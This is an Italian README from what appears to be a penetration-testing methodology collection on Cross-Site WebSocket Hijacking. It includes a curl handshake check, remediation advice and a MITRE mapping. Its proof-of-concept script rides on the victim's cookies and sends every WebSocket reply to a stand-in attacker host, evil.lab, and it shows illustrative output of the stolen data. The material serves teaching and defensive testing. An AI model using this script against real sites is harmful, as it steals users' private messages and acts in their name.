> [English](README.en.md) | **Italiano**

# WebSocket hijacking (CSWSH)

> - **Fase:** Web exploitation - OWASP A01:2021 Broken Access Control
> - **Visibilita:** Bassa - la connessione parte dal browser della vittima e appare legittima lato server
> - **Prerequisiti:** un endpoint WebSocket la cui autenticazione si basa solo sul cookie di sessione, senza validazione dell'header `Origin` ne token anti-CSRF nell'handshake
> - **Natura del documento:** metodologia + PoC pratico per ambiente di laboratorio. Nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: aprire, da un sito dell'attaccante, una connessione WebSocket cross-site verso il target usando i cookie della vittima, per leggere/inviare messaggi come lei (furto dati, azioni).

---

## Executive summary

La Cross-Site WebSocket Hijacking (CSWSH) e la "CSRF dei WebSocket": l'handshake WebSocket e una richiesta HTTP
a cui il browser allega automaticamente i cookie. Se il server autentica la connessione solo in base al cookie e
non valida l'header `Origin` ne usa un token anti-CSRF, una pagina dell'attaccante puo aprire una connessione WS
verso il target nel contesto autenticato della vittima e scambiare messaggi: leggere dati riservati (cronologia
chat, notifiche, stato) o inviare comandi. Severity tipica `Alto`.

## Esecuzione / comandi

### Fase 1 - verifica dell'handshake

```bash
# Si osserva l'handshake: se non c'e validazione di Origin ne token, e candidato a CSWSH
curl -s -I https://target.lab/ws -H "Origin: https://evil.lab" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=="
# risposta 101 Switching Protocols con Origin arbitrario -> Origin non validato
```

### Fase 2 - PoC (pagina dell'attaccante)

```html
<script>
// il browser della vittima allega i cookie: connessione WS nel suo contesto autenticato
const ws = new WebSocket('wss://target.lab/ws');
ws.onopen = () => ws.send('{"action":"getHistory"}');          // invia comandi come la vittima
ws.onmessage = e => fetch('https://evil.lab/collect?d=' + encodeURIComponent(e.data)); // esfiltra le risposte
</script>
```

Output illustrativo (sul server dell'attaccante):

```
GET /collect?d=%7B%22messages%22%3A%5B...%5D%7D   <-- messaggi/dati riservati della vittima esfiltrati
```

## Analisi dei risultati

Un handshake accettato con `Origin` arbitrario e un flusso di messaggi leggibile confermano la CSWSH: l'impatto
va dal furto dati (`Alto`) all'esecuzione di azioni sensibili via WS. Se il server valida l'`Origin` con una
allowlist e/o usa un token per-sessione nell'handshake, il vettore e chiuso.

### Analisi teorica

Come la CSRF, la CSWSH sfrutta l'autorizzazione ambientale (cookie allegati automaticamente), estesa al canale
WebSocket persistente. La Same-Origin Policy non protegge l'handshake WS. La contromisura e non fidarsi del solo
cookie: validare l'`Origin` contro una allowlist e includere un token anti-CSRF per-sessione nell'handshake.

## Remediation (blue team)

**Rilevamento.** Handshake WS con `Origin` esterno accettati; connessioni WS da referer inattesi.

**Hardening.** Validare l'header `Origin` (allowlist) nell'handshake; token anti-CSRF per-sessione; non basare
l'autorizzazione del canale solo sul cookie; `SameSite` sui cookie.

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | proxy/scanner | web - attivo | intercetta l'handshake e i messaggi ws; test della validazione di origin |
| `websocat` | client ws | cli - attivo | connessione manuale all'endpoint ws e invio di messaggi |

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | abuso di un endpoint websocket privo di validazione origin/token. |
| credential access | steal web session cookie | `T1539` | uso del contesto di sessione della vittima per aprire la connessione ws. |

---

## Correlazioni con altri finding

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [csrf](<../csrf (Cross-Site Request Forgery)/README.md>) | websocket hijacking | stessa radice (cookie ambientale), applicata al canale websocket |
| websocket hijacking | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.md>) | la remediation (validazione origin, token) si collega al secure coding |

---

> **Nota:** Contenuto didattico. I PoC vanno usati solo su applicazioni di proprieta o con autorizzazione esplicita, in laboratorio. Output illustrativi.
